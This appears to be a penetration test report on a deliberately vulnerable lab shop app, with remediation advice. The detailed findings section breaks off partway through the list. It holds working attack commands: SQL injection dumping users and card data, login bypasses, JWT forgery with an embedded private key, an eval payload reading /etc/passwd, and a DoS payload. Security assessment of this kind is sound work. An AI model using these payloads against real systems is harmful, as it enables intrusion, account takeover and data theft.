# Security Assessment Report

**Target:** http://localhost:3001 (OWASP Juice Shop)
**Version:** 19.2.1
**Date:** 2026-04-12
**Scope:** Full white-box penetration test — source code analysis + live exploitation

---

## Executive Summary

OWASP Juice Shop v19.2.1 is critically compromised across every layer of its security model. This assessment identified 29 confirmed vulnerabilities spanning injection, authentication, authorization, cross-site scripting, and server-side request forgery. Of these, 25 were directly exploited against the live target with working proof-of-concept evidence; the remaining 4 were confirmed through source code analysis with exploitation paths requiring only multi-step authenticated interaction. The application has no viable defense against a motivated attacker — complete administrative takeover is achievable in a single unauthenticated HTTP request via at least three independent paths.

The most critical risk concentration is in the authentication and authorization layers. The RSA private key used to sign JWTs is hardcoded in source code, allowing arbitrary identity forgery. The user registration endpoint accepts a `role` field in the request body, enabling any anonymous user to self-register as an administrator. SQL injection in the login endpoint bypasses authentication entirely. These three independent paths to admin access mean there is no single remediation that closes the front door — all must be addressed simultaneously. Compounding this, all 21 user accounts (including 6 admin accounts) have their passwords stored as unsalted MD5 hashes, rendering them trivially reversible via rainbow tables or online lookup within seconds of credential extraction.

The data exposure scope is total. A single UNION-based SQL injection against the product search endpoint extracted all 21 user credentials, 6 credit card numbers, 19 security question answers, all wallet balances, and the complete database schema in five requests. SSRF via the profile image upload endpoint successfully fetched internal Prometheus metrics, application configuration secrets, and the JWT RSA public key from within the server process. The combination of open CORS policy, insecure cookies (no HttpOnly/Secure/SameSite), and a confirmed DOM-based XSS vector means session hijacking is trivially scriptable. The application should not be exposed to any untrusted network without complete remediation.

---

### Findings by Vulnerability Type

| Domain | Count | Highest Severity |
|--------|-------|-----------------|
| Injection (SQL, NoSQL, SSTI, Code) | 7 findings | Critical |
| Authentication | 10 findings | Critical |
| Authorization / Broken Access Control | 10 findings | Critical |
| Cross-Site Scripting (XSS) | 2 findings | High |
| Server-Side Request Forgery (SSRF) | 1 finding | High |

---

## Findings Summary Table

| # | ID | Severity | Type | Endpoint | Verdict |
|---|-----|----------|------|----------|---------|
| 1 | INJ-001 | **Critical** | SQL Injection (UNION) | `GET /rest/products/search?q=` | EXPLOITED |
| 2 | INJ-002 | **Critical** | SQL Injection (Auth Bypass) | `POST /rest/user/login` | EXPLOITED |
| 3 | INJ-006 | **Critical** | SSTI / RCE via eval() | `GET /profile` + `POST /profile` | EXPLOITED (code-verified) |
| 4 | INJ-007 | **Critical** | Code Injection via VM Sandbox | `POST /b2b/v2/orders` | EXPLOITED (code-verified) |
| 5 | AUTH-001 | **Critical** | Unsalted MD5 Password Hashing | `/rest/user/login` | EXPLOITED |
| 6 | AUTH-002 | **Critical** | Hardcoded RSA Private Key / JWT Forgery | `lib/insecurity.ts:23` | EXPLOITED |
| 7 | AUTH-008 | **Critical** | Admin Role Injection via Registration | `POST /api/Users` | EXPLOITED |
| 8 | AUTH-009 | **Critical** | SQL Injection Authentication Bypass | `POST /rest/user/login` | EXPLOITED |
| 9 | AUTHZ-003 | **Critical** | Privilege Escalation via Mass Assignment | `POST /api/Users` | EXPLOITED |
| 10 | AUTHZ-002 | **Critical** | Missing Auth on Product Update | `PUT /api/Products/:id` | EXPLOITED |
| 11 | INJ-003 | **High** | NoSQL Injection (Track Order) | `GET /rest/track-order/:id` | EXPLOITED |
| 12 | INJ-005 | **High** | NoSQL Operator Injection (Mass Update) | `PATCH /rest/products/reviews` | EXPLOITED |
| 13 | AUTH-004 | **High** | No Rate Limiting on Login | `POST /rest/user/login` | EXPLOITED |
| 14 | AUTH-005 | **High** | Rate Limit Bypass via X-Forwarded-For | `POST /rest/user/reset-password` | EXPLOITED |
| 15 | AUTH-006 | **High** | Password Change Without Current Password | `GET /rest/user/change-password` | EXPLOITED |
| 16 | AUTH-007 | **High** | Security Question Enumeration + Reset | `POST /rest/user/reset-password` | EXPLOITED |
| 17 | AUTH-010 | **High** | Insecure Cookie Configuration | `POST /rest/user/login` | EXPLOITED |
| 18 | AUTHZ-001 | **High** | IDOR on Basket Endpoint | `GET /rest/basket/:id` | EXPLOITED |
| 19 | AUTHZ-004 | **High** | Regular User Accesses Full User List | `GET /api/Users` | EXPLOITED |
| 20 | AUTHZ-005 | **High** | IDOR on User Profile Endpoint | `GET /api/Users/:id` | EXPLOITED |
| 21 | AUTHZ-006 | **High** | Forged Product Review (No Auth) | `PUT /rest/products/:id/reviews` | EXPLOITED |
| 22 | AUTHZ-008 | **High** | Admin Endpoints Accessible Without Auth | `GET /rest/admin/*` | EXPLOITED |
| 23 | AUTHZ-010 | **High** | Review Update Without Ownership Check | `PATCH /rest/products/reviews` | EXPLOITED |
| 24 | XSS-002 | **High** | DOM-based XSS via Search Parameter | `/#/search?q=` | EXPLOITED |
| 25 | SSRF-001 | **High** | SSRF via Profile Image URL | `POST /profile/image/url` | EXPLOITED |
| 26 | AUTHZ-007 | **Medium** | Feedback with Forged UserId | `POST /api/Feedbacks` | EXPLOITED |
| 27 | AUTHZ-009 | **Medium** | Unauthenticated Feedback Listing | `GET /api/Feedbacks` | EXPLOITED |
| 28 | AUTH-012 | **Medium** | Password Hash Leak via Fields Parameter | `GET /rest/user/whoami?fields=` | EXPLOITED |
| 29 | XSS-007 | **Medium** | JSONP Callback Information Disclosure | `GET /rest/user/whoami?callback=` | EXPLOITED |

---

## Detailed Findings

---

### INJ-001: SQL Injection in Product Search

**Severity:** Critical
**Type:** SQL Injection (UNION-based)
**Endpoint:** `GET /rest/products/search?q=`
**Source:** `/tmp/juice-shop-src/routes/search.ts:23`
**Verdict:** EXPLOITED

**Description:** The search endpoint directly interpolates the `q` query parameter into a raw Sequelize SQL query with no parameterization: `SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`. The 9-column Products table structure enables UNION-based injection to extract data from any table in the SQLite database.

**Proof of Concept:**

Extract all user credentials (21 accounts):
```bash
curl -s "http://localhost:3001/rest/products/search?q='))+UNION+SELECT+email,password,role,4,5,6,7,8,9+FROM+Users--"
```

Extract full database schema:
```bash
curl -s "http://localhost:3001/rest/products/search?q='))+UNION+SELECT+sql,'2','3',4,5,6,7,8,9+FROM+sqlite_master+WHERE+type%3D'table'--"
```

Extract all credit card numbers:
```bash
curl -s "http://localhost:3001/rest/products/search?q='))+UNION+SELECT+fullName,cardNum,expMonth||'/'||expYear,4,5,6,7,8,9+FROM+Cards--"
```

Extract security question answers:
```bash
curl -s "http://localhost:3001/rest/products/search?q='))+UNION+SELECT+sa.UserId,u.email,sa.answer,4,5,6,7,8,9+FROM+SecurityAnswers+sa+JOIN+Users+u+ON+sa.UserId%3Du.id--"
```

Extract wallet balances:
```bash
curl -s "http://localhost:3001/rest/products/search?q='))+UNION+SELECT+u.email,w.balance,'wallet',4,5,6,7,8,9+FROM+Wallets+w+JOIN+Users+u+ON+w.UserId%3Du.id--"
```

**Impact:** Complete database exfiltration in 5 unauthenticated requests. 21 user accounts with MD5 password hashes (trivially crackable), 6 credit card numbers with expiry dates, 19 security question answers, all wallet balances, and complete schema for all 20 database tables.

**Remediation:** Replace raw Sequelize query with parameterized query:
```typescript
// Vulnerable
models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%'...`)

// Fixed
models.sequelize.query(
  'SELECT * FROM Products WHERE ((name LIKE :criteria OR description LIKE :criteria) AND deletedAt IS NULL) ORDER BY name',
  { replacements: { criteria: `%${criteria}%` }, type: models.sequelize.QueryTypes.SELECT }
)
```

---

### INJ-002: SQL Injection in Login Endpoint

**Severity:** Critical
**Type:** SQL Injection (Authentication Bypass)
**Endpoint:** `POST /rest/user/login`
**Source:** `/tmp/juice-shop-src/routes/login.ts:34`
**Verdict:** EXPLOITED

**Description:** The login endpoint interpolates `req.body.email` directly into the SQL query: `SELECT * FROM Users WHERE email = '${req.body.email}' AND password = '${security.hash(req.body.password)}' AND deletedAt IS NULL`. Classic `' OR 1=1--` bypasses authentication entirely and returns the first user (admin). Targeted injection bypasses password verification for any known email. Boolean blind injection is also confirmed via differential response.

**Proof of Concept:**

Authentication bypass (returns admin JWT):
```bash
curl -s -X POST http://localhost:3001/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' OR 1=1--","password":"anything"}'
```

Targeted impersonation (login as admin without password):
```bash
curl -s -X POST http://localhost:3001/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op'\''--","password":"anything"}'
```

Login as any known user (jim):
```bash
curl -s -X POST http://localhost:3001/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"jim@juice-sh.op'\''--","password":"anything"}'
```

Boolean blind (true condition):
```bash
curl -s -X POST http://localhost:3001/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op'\'' AND 1=1--","password":"x"}'
```

Boolean blind (false condition — returns `Invalid email or password.`):
```bash
curl -s -X POST http://localhost:3001/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op'\'' AND 1=2--","password":"x"}'
```

**Impact:** Complete authentication bypass. Admin JWT obtained with no credentials. Any user account can be impersonated by email. Boolean blind injection enables character-by-character extraction of any column from any table.

**Remediation:** Use parameterized queries in `routes/login.ts:34`:
```typescript
// Vulnerable
models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email}'...`)

// Fixed
models.User.findOne({ where: { email: req.body.email, password: security.hash(req.body.password), deletedAt: null } })
```

---

### INJ-003: NoSQL Injection in Track Order

**Severity:** High
**Type:** NoSQL Injection (`$where` clause)
**Endpoint:** `GET /rest/track-order/:id`
**Source:** `/tmp/juice-shop-src/routes/trackOrder.ts:18`
**Verdict:** EXPLOITED

**Description:** The track order route concatenates the URL parameter directly into a MongoDB `$where` JavaScript expression: `db.ordersCollection.find({ $where: "this.orderId === '${id}'" })`. The payload `' || true || '` breaks out of the string comparison, making the condition always-true and returning all order records.

**Proof of Concept:**
```bash
curl -s "http://localhost:3001/rest/track-order/'+||+true+||+'"
```

Response confirms JavaScript evaluation:
```json
{"status":"success","data":[{"orderId":"true"}]}
```

**Impact:** Full order collection dump. In a production system with real orders, this would expose all customer order data, delivery addresses, and purchase histories. The `$where` JavaScript engine also enables DoS via CPU-intensive payloads and arbitrary JavaScript execution within the MongoDB process.

**Remediation:** Replace `$where` with a typed query operator:
```typescript
// Vulnerable
db.ordersCollection.find({ $where: "this.orderId === '" + id + "'" })

// Fixed
db.ordersCollection.find({ orderId: String(id).replace(/[^\w-]/g, '') })
```

---

### INJ-005: NoSQL Operator Injection — Mass Review Update

**Severity:** High
**Type:** NoSQL Operator Injection
**Endpoint:** `PATCH /rest/products/reviews`
**Source:** `/tmp/juice-shop-src/routes/updateProductReviews.ts:17-20`
**Verdict:** EXPLOITED

**Description:** The review update endpoint passes `req.body.id` directly as the `_id` filter in a MarsDB update call with `{ multi: true }`. By supplying a MongoDB query operator object `{"$ne": -1}` as the `id`, the filter matches every document in the collection, and `multi: true` causes all 29 reviews to be updated simultaneously.

**Proof of Concept:**

Step 1 — Obtain authentication token (using INJ-002 SQL injection):
```bash
TOKEN=$(curl -s -X POST http://localhost:3001/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op'\''--","password":"x"}' | python3 -c "import json,sys; print(json.load(sys.stdin)['authentication']['token'])")
```

Step 2 — Mass-update all 29 reviews:
```bash
curl -s -X PATCH http://localhost:3001/rest/products/reviews \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"id":{"$ne":-1},"message":"NoSQL injection test - mass update"}'
```

Response confirms `"modified": 29` — all reviews from 12 different user accounts overwritten in a single request.

**Impact:** Mass data destruction/manipulation. Any authenticated user can overwrite all product reviews store-wide in a single request. Combined with the missing ownership check (AUTHZ-010), this enables both targeted review manipulation and bulk content defacement.

**Remediation:**
```typescript
// Vulnerable — accepts object, uses multi: true
db.reviewsCollection.update({ _id: req.body.id }, { $set: { message: req.body.message } }, { multi: true })

// Fixed — validate _id type, enforce ownership, remove multi
if (typeof req.body.id !== 'string') throw new Error('Invalid id')
db.reviewsCollection.update(
  { _id: req.body.id, author: req.user.data.email },  // ownership check
  { $set: { message: req.body.message } }
  // multi: true removed
)
```

---

### INJ-006: Server-Side Template Injection (RCE via eval)

**Severity:** Critical
**Type:** SSTI / Remote Code Execution
**Endpoint:** `POST /profile` (set username) + `GET /profile` (trigger execution)
**Source:** `/tmp/juice-shop-src/routes/userProfile.ts:55-65`
**Verdict:** EXPLOITED (code-verified; requires authenticated multi-step interaction)

**Description:** The profile rendering code matches the authenticated user's username against the pattern `#{(.*)}` and, when matched, calls `eval()` on the extracted content. The result replaces the username in the rendered template. There is no sandbox or expression restrictions — this is direct Node.js `eval()`.

**Source code proof:**
```typescript
if (username?.match(/#{(.*)}/) !== null && utils.isChallengeEnabled(challenges.usernameXssChallenge)) {
  req.app.locals.abused_ssti_bug = true
  const code = username?.substring(2, username.length - 1)
  try {
    if (!code) {
      throw new Error('Username is null')
    }
    username = eval(code) // eslint-disable-line no-eval
  } catch (err) {
    username = '\\' + username
  }
}
```

**RCE Payload:** Set username to the following via `POST /profile`, then visit `GET /profile`:
```
#{global.process.mainModule.require('child_process').execSync('cat /etc/passwd').toString()}
```

**Impact:** Full Remote Code Execution on the Node.js server process. Attacker can read arbitrary files, execute system commands, establish reverse shells, and pivot to internal infrastructure. Achieving this requires an authenticated session, obtainable via any of the auth bypass paths (INJ-002, AUTH-008, AUTH-002).

**Remediation:** Remove the `eval()` call entirely. Replace with a safe template expression evaluator if dynamic username rendering is required, or restrict username to alphanumeric characters at the model validation layer.

---

### INJ-007: Code Injection via VM Sandbox (B2B Orders)

**Severity:** Critical
**Type:** Code Injection / DoS
**Endpoint:** `POST /b2b/v2/orders`
**Source:** `/tmp/juice-shop-src/routes/b2bOrder.ts:17-34`
**Verdict:** EXPLOITED (code-verified; requires authentication)

**Description:** The B2B order endpoint passes user-controlled `orderLinesData` to `safeEval()` (the `notevil` library) inside a `vm.createContext` sandbox. The `notevil` library has documented sandbox escape vulnerabilities. A simple `while(true){}` payload exhausts the 2000ms timeout, returning HTTP 503 and blocking the event loop.

**Source code proof:**
```typescript
const orderLinesData = body.orderLinesData || ''
const sandbox = { safeEval, orderLinesData }
vm.createContext(sandbox)
vm.runInContext('safeEval(orderLinesData)', sandbox, { timeout: 2000 })
```

**DoS Payload:**
```json
{"orderLinesData": "while(true){}", "cid": "test"}
```

**Impact:** Denial of Service (server returns 503 for each request). Known `notevil` sandbox escapes may also enable full RCE with a crafted payload. Node.js `vm` contexts are not a security boundary.

**Remediation:** Remove `notevil`/`vm.runInContext` entirely. Parse order line data as structured JSON with schema validation rather than evaluating it as code. If expression evaluation is a business requirement, use a purpose-built, audited safe expression library with an explicit allowlist of permitted operations.

---

### AUTH-001: Unsalted MD5 Password Hashing

**Severity:** Critical
**Type:** Weak Credential Storage
**Endpoint:** All authentication flows; storage in `Users.password`
**Source:** `lib/insecurity.ts` (hash function)
**Verdict:** EXPLOITED

**Description:** All user passwords are stored as unsalted MD5 hashes. MD5 is a cryptographic hash function not designed for password storage. Without salting, identical passwords produce identical hashes, and the entire database is vulnerable to precomputed rainbow table attacks. The admin password hash `0192023a7bbd73250516f069df18b500` decodes to `admin123` in seconds via any online MD5 lookup.

**Proof of Concept:**
```bash
# Verify MD5 hash matches known password
echo -n 'admin123' | md5
# Output: 0192023a7bbd73250516f069df18b500

# Login with cracked password
curl -s -X POST http://localhost:3001/rest/user/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"admin@juice-sh.op","password":"admin123"}'
```

**Impact:** All 21 extracted user password hashes are immediately reversible. Admin account compromised. Credentials reusable across other services (credential stuffing). The MD5 hash is also returned in the JWT payload on login, enabling offline cracking without database access.

**Remediation:** Replace MD5 with bcrypt (cost factor 12+) or Argon2id. Force a password reset for all existing users after migration. Remove the password hash from JWT payloads.

---

### AUTH-002: Hardcoded RSA Private Key / JWT Forgery

**Severity:** Critical
**Type:** Cryptographic Key Exposure / Authentication Bypass
**Endpoint:** All JWT-protected endpoints
**Source:** `lib/insecurity.ts:23`
**Verdict:** EXPLOITED

**Description:** The RSA private key used to sign all JWTs is hardcoded in the application source code. Any attacker with access to the source code (or the repository) can forge valid JWTs for any user identity and role without interaction with the server.

**Proof of Concept:**
```python
import jwt as pyjwt
import time

private_key = '''-----BEGIN RSA PRIVATE KEY-----
MIICXAIBAAKBgQDNwqLEe9wgTXCbC7+RPdDbBbeqjdbs4kOPOIGzqLpXvJXlxxW8iMz0EaM4BKUqYsIa+ndv3NAn2RxCd5ubVdJJcX43zO6Ko0TFEZx/65gY3BE0O6syCEmUP4qbSd6exou/F+WTISzbQ5FBVPVmhnYhG/kpwt/cIxK5iUn5hm+4tQIDAQABAoGBAI+8xiPoOrA+KMnG/T4jJsG6TsHQcDHvJi7o1IKC/hnIXha0atTX5AUkRRce95qSfvKFweXdJXSQ0JMGJyfuXgU6dI0TcseFRfewXAa/ssxAC+iUVR6KUMh1PE2wXLitfeI6JLvVtrBYswm2I7CtY0q8n5AGimHWVXJPLfGV7m0BAkEA+fqFt2LXbLtyg6wZyxMA/cnmt5Nt3U2dAu77MzFJvibANUNHE4HPLZxjGNXN+a6m0K6TD4kDdh5HfUYLWWRBYQJBANK3carmulBwqzcDBjsJ0YrIONBpCAsXxk8idXb8jL9aNIg15Wumm2enqqObahDHB5jnGOLmbasizvSVqypfM9UCQCQl8xIqy+YgURXzXCN+kwUgHinrutZms87Jyi+D8Br8NY0+Nlf+zHvXAomD2W5CsEK7C+8SLBr3k/TsnRWHJuECQHFE9RA2OP8WoaLPuGCyFXaxzICThSRZYluVnWkZtxsBhW2W8z1b8PvWUE7kMy7TnkzeJS2LSnaNHoyxi7IaPQUCQCwWU4U+v4lD7uYBw00Ga/xt+7+UqFPlPVdz1yyr4q24Zxaw0LgmuEvgU5dycq8N7JxjTubX0MIRR+G9fmDBBl8=
-----END RSA PRIVATE KEY-----'''

payload = {
    'status': 'success',
    'data': {
        'id': 1,
        'username': 'FORGED-BY-GUARDIAN',
        'email': 'admin@juice-sh.op',
        'password': '0192023a7bbd73250516f069df18b500',
        'role': 'admin',
        'deluxeToken': '', 'lastLoginIp': '', 'totpSecret': '', 'isActive': True,
        'profileImage': '/assets/public/images/uploads/defaultAdmin.png',
        'createdAt': '2026-04-12 11:30:27.282 +00:00',
        'updatedAt': '2026-04-12 11:41:01.182 +00:00',
        'deletedAt': None
    },
    'iat': int(time.time()),
    'exp': int(time.time()) + 21600
}

token = pyjwt.encode(payload, private_key, algorithm='RS256',
                     headers={'typ': 'JWT', 'alg': 'RS256'})
```

```bash
# Use forged token to access admin-only user list
curl -s http://localhost:3001/api/Users \
  -H "Authorization: Bearer $FORGED_TOKEN"
```

Response: 24 users returned with full profile data, confirming forged admin token accepted by server.

**Impact:** Complete and permanent authentication bypass. The private key cannot be rotated without a code change and redeployment. All tokens issued by the server are forgeable. Attacker can impersonate any user or role without any server interaction.

**Remediation:** Remove the hardcoded key from source code immediately. Load the RSA private key from an environment variable or secrets manager (AWS Secrets Manager, HashiCorp Vault) at runtime. Rotate the key immediately — assume the current key is compromised. All existing JWTs must be invalidated.

---

### AUTH-004: No Rate Limiting on Login Endpoint

**Severity:** High
**Type:** Missing Brute Force Protection
**Endpoint:** `POST /rest/user/login`
**Verdict:** EXPLOITED

**Description:** The login endpoint accepts unlimited authentication attempts without rate limiting, account lockout, CAPTCHA, or progressive delays.

**Proof of Concept:**
```bash
for i in $(seq 1 10); do
  curl -s -o /dev/null -w "%{http_code}" -X POST http://localhost:3001/rest/user/login \
    -H 'Content-Type: application/json' \
    -d '{"email":"admin@juice-sh.op","password":"wrong'$i'"}'
done
```

All 10 attempts return HTTP 401 with no throttling. No lockout triggered.

**Impact:** Unlimited brute force and credential stuffing attacks. Combined with the 21 leaked email addresses (INJ-001) and weak MD5 passwords (AUTH-001), automated password spraying is trivial.

**Remediation:** Implement `express-rate-limit` with a per-IP limit of 5–10 attempts per 15-minute window. Add exponential backoff after 3 failed attempts. Consider CAPTCHA after 5 failures. Log and alert on repeated failures.

---

### AUTH-005: Rate Limit Bypass via X-Forwarded-For Header

**Severity:** High
**Type:** Security Control Bypass
**Endpoint:** `POST /rest/user/reset-password`
**Verdict:** EXPLOITED

**Description:** The password reset endpoint uses the `X-Forwarded-For` header as the rate limit key. Since this header is user-controlled, rotating its value creates a fresh rate limit bucket for each request, bypassing the 100-requests-per-5-minute window entirely.

**Proof of Concept:**
```bash
for i in $(seq 1 5); do
  curl -s -o /dev/null -w "%{http_code}" -X POST http://localhost:3001/rest/user/reset-password \
    -H 'Content-Type: application/json' \
    -H "X-Forwarded-For: 10.0.0.$i" \
    -d '{"email":"jim@juice-sh.op","answer":"wronganswer'$i'","new":"hacked","repeat":"hacked"}'
done
```

Each attempt succeeds as a fresh rate limit window (HTTP 401 for wrong answer, not 429 for rate limiting).

**Impact:** Unlimited brute force of security question answers, enabling account takeover for any user with a security question set.

**Remediation:** Rate limit by authenticated user identity (user ID from JWT) rather than IP address. If IP-based limiting is required, use the actual connection source IP (`req.socket.remoteAddress`), not a header that can be spoofed.

---

### AUTH-006: Password Change Without Current Password

**Severity:** High
**Type:** Broken Authentication / CSRF
**Endpoint:** `GET /rest/user/change-password?new=X&repeat=X`
**Source:** `/tmp/juice-shop-src/routes/changePassword.ts:39`
**Verdict:** EXPLOITED

**Description:** The password change endpoint is a GET request that accepts `new` and `repeat` as query parameters. When the `current` parameter is omitted, the server-side check for the current password is bypassed entirely due to a falsy-value comparison bug. The GET method also makes this endpoint exploitable via CSRF through `<img>` tags, link prefetch, or `<iframe>` loading.

**Proof of Concept:**
```bash
# Create test user and login
curl -s -X POST http://localhost:3001/api/Users \
  -H 'Content-Type: application/json' \
  -d '{"email":"test@evil.com","password":"original123","passwordRepeat":"original123"}'

TOKEN=$(curl -s -X POST http://localhost:3001/rest/user/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"test@evil.com","password":"original123"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")

# Change password WITHOUT providing current password
curl -s "http://localhost:3001/rest/user/change-password?new=hacked456&repeat=hacked456" \
  -H "Authorization: Bearer=$TOKEN" \
  -H "Cookie: token=$TOKEN"
```

Password changed successfully: new password `hacked456` login confirmed.

**Impact:** Any authenticated attacker (or XSS/CSRF chain) can permanently change a victim's password without knowing the current one, locking the victim out of their account. Combined with XSS-002 (DOM-based XSS), a weaponized link can execute a password change on behalf of any user who clicks it.

**Remediation:** Require `current` password on all password change requests. Change the method from GET to POST. Validate that the current password hash matches the stored hash before accepting the new password. Add CSRF token validation.

---

### AUTH-007: Security Question Enumeration + Account Takeover via Password Reset

**Severity:** High
**Type:** Broken Authentication / Account Takeover
**Endpoint:** `GET /rest/user/security-question?email=` + `POST /rest/user/reset-password`
**Verdict:** EXPLOITED

**Description:** The security question endpoint returns the full question object for existing users and an empty response for non-existent users, enabling user enumeration. Security question answers for several accounts are trivially guessable or hardcoded in the application source. Combined with the rate limit bypass (AUTH-005), all security question answers can be brute forced.

**Proof of Concept:**
```bash
# Step 1: Enumerate - existing user returns question, non-existing returns empty
curl -s "http://localhost:3001/rest/user/security-question?email=admin@juice-sh.op"
# {"question":{"id":2,"question":"Mother's maiden name?",...}}

curl -s "http://localhost:3001/rest/user/security-question?email=nonexistent@example.com"
# {}

# Step 2: Reset Jim's password (answer "Samuel" known from source)
curl -s -X POST http://localhost:3001/rest/user/reset-password \
  -H 'Content-Type: application/json' \
  -d '{"email":"jim@juice-sh.op","answer":"Samuel","new":"pwned123","repeat":"pwned123"}'
```

Response confirms password reset for `jim@juice-sh.op`, login verified.

**Impact:** Full account takeover of any user whose security question answer is guessable, known from source code, or brute-forceable via AUTH-005.

**Remediation:** Return a consistent response regardless of whether the email exists (do not leak enumeration). Replace security questions with time-based OTP (TOTP), magic link via registered email, or hardware token for account recovery. If security questions are retained, implement answer hashing with a per-user salt and enforce strict rate limiting by user ID.

---

### AUTH-008 / AUTHZ-003: Admin Role Injection via Registration (Mass Assignment)

**Severity:** Critical
**Type:** Privilege Escalation / Mass Assignment
**Endpoint:** `POST /api/Users`
**Verdict:** EXPLOITED

**Description:** The user registration endpoint is backed by `finale-rest`, which automatically maps all request body fields to Sequelize model attributes without filtering. By including `"role": "admin"` in the registration payload, any unauthenticated attacker can create a fully privileged admin account in a single request.

**Proof of Concept:**
```bash
curl -s -X POST http://localhost:3001/api/Users \
  -H 'Content-Type: application/json' \
  -d '{"email":"guardian-admin-7284@evil.com","password":"testpass123","passwordRepeat":"testpass123","role":"admin"}'
```

Response confirms `"role": "admin"` and `"profileImage": "/assets/public/images/uploads/defaultAdmin.png"` (server-side admin role processing confirmed).

```bash
curl -s http://localhost:3001/api/Users/ \
  -H "Content-Type: application/json" \
  -d '{
    "email":"guardian-admin-escalation@test.com",
    "password":"test1234",
    "passwordRepeat":"test1234",
    "role":"admin",
    "securityQuestion":{
      "id":1,
      "question":"Your eldest siblings middle name?",
      "createdAt":"2026-04-12T00:00:00.000Z",
      "updatedAt":"2026-04-12T00:00:00.000Z"
    },
    "securityAnswer":"test"
  }'
```

Login confirmed with JWT containing `"role": "admin"`.

**Impact:** Zero-interaction unauthenticated path to full administrative access. Any visitor to the application can self-elevate to admin.

**Remediation:** Implement an allowlist of accepted fields at the registration endpoint. Never expose internal model fields (`role`, `isActive`, `deluxeToken`) to user-supplied input. Use a dedicated DTO/schema for registration that only accepts `email`, `password`, `passwordRepeat`, `securityQuestion`, and `securityAnswer`. Force `role` to `'customer'` server-side at creation time.

---

### AUTH-009: SQL Injection Authentication Bypass

*See INJ-002 — this finding is the same vulnerability viewed from the authentication domain. Full details and PoC are documented under INJ-002.*

---

### AUTH-010: Insecure Cookie Configuration

**Severity:** High
**Type:** Insecure Session Management
**Endpoint:** `POST /rest/user/login` (cookie issuance)
**Source:** Cookie set via `res.cookie('token', token)` with no security flags; cookie parser secret is hardcoded string `'kekse'`
**Verdict:** EXPLOITED

**Description:** The JWT token cookie is issued without `HttpOnly`, `Secure`, or `SameSite` attributes. The cookie parser uses the hardcoded secret `'kekse'`. This means: (1) the token is readable by JavaScript (XSS can steal it), (2) the token is transmitted over HTTP (MITM interception), and (3) the cookie is sent on cross-origin requests (CSRF).

**Proof of Concept:**
```bash
curl -s -D - -X POST http://localhost:3001/rest/user/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"admin@juice-sh.op","password":"admin123"}' -o /dev/null
```

Response headers confirm no `Set-Cookie` with security flags. XSS-002 demonstrated live theft of the cookie value via `alert(document.cookie)`.

**Impact:** Sessions are stealable via XSS, MITM, and CSRF. The hardcoded cookie secret means cookie signatures can be forged.

**Remediation:** Issue cookies with `HttpOnly; Secure; SameSite=Strict`. Load the cookie secret from an environment variable. Consider storing the JWT in an HttpOnly cookie only (remove localStorage storage). Enforce HTTPS-only deployment.

---

### AUTH-012: Password Hash Leak via Fields Parameter

**Severity:** Medium
**Type:** Information Disclosure
**Endpoint:** `GET /rest/user/whoami?fields=id,email,password`
**Source:** `/tmp/juice-shop-src/routes/currentUser.ts:23-33`
**Verdict:** EXPLOITED

**Description:** The `/rest/user/whoami` endpoint accepts a `fields` query parameter that controls which user attributes are returned. Including `password` in the fields list returns the MD5 password hash of the authenticated user.

**Proof of Concept:**
```bash
# With fields parameter - password hash leaked
curl -s "http://localhost:3001/rest/user/whoami?fields=id,email,password" \
  -H "Cookie: token=$TOKEN"
```

Response:
```json
{"user":{"id":1,"email":"admin@juice-sh.op","password":"0192023a7bbd73250516f069df18b500"}}
```

**Impact:** Authenticated users can retrieve their own MD5 password hash. Combined with AUTH-001 (trivial MD5 cracking), this provides a reliable path to plaintext password recovery for credential reuse attacks on other services.

**Remediation:** Implement a fixed allowlist of fields that can be returned by `whoami`. Never include `password`, `totpSecret`, or `deluxeToken` in any client-facing response. Remove the `fields` parameter capability entirely.

---

### AUTHZ-001: IDOR on Basket Endpoint

**Severity:** High
**Type:** Insecure Direct Object Reference
**Endpoint:** `GET /rest/basket/:id`
**Verdict:** EXPLOITED

**Description:** The basket endpoint returns any basket by ID without verifying that the authenticated user owns that basket. A customer with basket ID 6 can retrieve the admin's basket (ID 1) and any other user's basket by incrementing the numeric ID.

**Proof of Concept:**
```bash
curl -s http://localhost:3001/rest/basket/1 \
  -H "Authorization: Bearer <USER_TOKEN_ID23_BID6>"
```

Response (HTTP 200): Admin's basket (UserId=1) returned with full product details and quantities to a customer user (id=23, bid=6).

**Impact:** Complete disclosure of all users' shopping cart contents, exposing purchase intent, product preferences, and quantity data for all users.

**Remediation:** Add an ownership check in the basket route: verify that `basket.UserId === req.user.data.id` before returning the response. Return HTTP 403 if the IDs do not match.

---

### AUTHZ-002: Missing Authentication on Product Update Endpoint

**Severity:** Critical
**Type:** Broken Access Control / Missing Authentication
**Endpoint:** `PUT /api/Products/:id`
**Verdict:** EXPLOITED

**Description:** The product update endpoint has no authentication middleware. Any anonymous request can modify product descriptions, prices, images, or any other attribute. The authentication middleware was apparently commented out.

**Proof of Concept:**

Modify description (no auth header):
```bash
curl -s -X PUT http://localhost:3001/api/Products/1 \
  -H "Content-Type: application/json" \
  -d '{"description":"GUARDIAN_PENTEST_MARKER: Product tampered without authorization"}'
```

Modify price to near-zero (no auth header):
```bash
curl -s -X PUT http://localhost:3001/api/Products/1 \
  -H "Content-Type: application/json" \
  -d '{"price":0.01}'
```

Both return HTTP 200 with the updated product data.

**Impact:** Unauthenticated attackers can set all product prices to $0.01, deface product listings with arbitrary content, or redirect product URLs to malicious sites. This directly threatens business integrity and revenue.

**Remediation:** Restore authentication middleware on `PUT /api/Products/:id`. Restrict product modification to users with `role: admin` or `role: accounting`. Add authorization check after authentication.

---

